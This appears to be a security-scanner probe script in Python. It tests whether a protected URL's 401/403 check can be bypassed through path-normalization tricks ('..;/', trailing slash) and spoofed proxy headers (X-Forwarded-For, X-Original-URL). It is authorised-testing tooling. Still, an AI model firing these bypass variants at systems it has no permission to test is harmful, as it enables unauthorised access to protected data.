# artex-name: intranet-auth-path-header-bypass
# artex-severity: high
# artex-tags: auth-bypass,idor,acl,nginx,spring,intranet
# artex-desc: Probe common HTTP path normalization (..;/, %2e, trailing slash) and proxy header spoofing (X-Forwarded-For, X-Original-URL) against a protected URL.
# artex-guidance: Compare baseline 401/403 status/length against bypass variants; confirm actual business data is returned before reporting.
import os, sys, urllib.parse, urllib.request, urllib.error

target = os.environ.get("ARTEX_POC_TARGET", "").strip()
if not target:
    print("ARTEX_POC_TARGET is required", file=sys.stderr)
    sys.exit(2)

def fetch(url, headers=None):
    req = urllib.request.Request(url, method="GET", headers=headers or {"User-Agent": "ARTEX-ACL-Probe/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            body = r.read(1024)
            return r.status, len(body)
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(1024))
    except Exception:
        return 0, 0

base_status, base_len = fetch(target)
print(f"baseline: status={base_status} sample_len={base_len}")
if base_status not in (401, 403):
    print("baseline is not 401/403; skipping bypass comparison")
    sys.exit(1)

u = urllib.parse.urlsplit(target)
base_origin = f"{u.scheme}://{u.netloc}"
path = u.path or "/"
variants = [
    ("trailing-slash", target.rstrip("/") + "/", {}),
    ("dot-semicolon", base_origin + "/..;" + path, {}),
    ("xff-loopback", target, {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}),
    ("x-original-url", base_origin + "/", {"X-Original-URL": path, "X-Rewrite-URL": path}),
]
hits = 0
for label, vurl, hdrs in variants:
    st, ln = fetch(vurl, hdrs)
    print(f"variant={label} status={st} sample_len={ln}")
    if st == 200:
        hits += 1
sys.exit(0 if hits > 0 else 1)
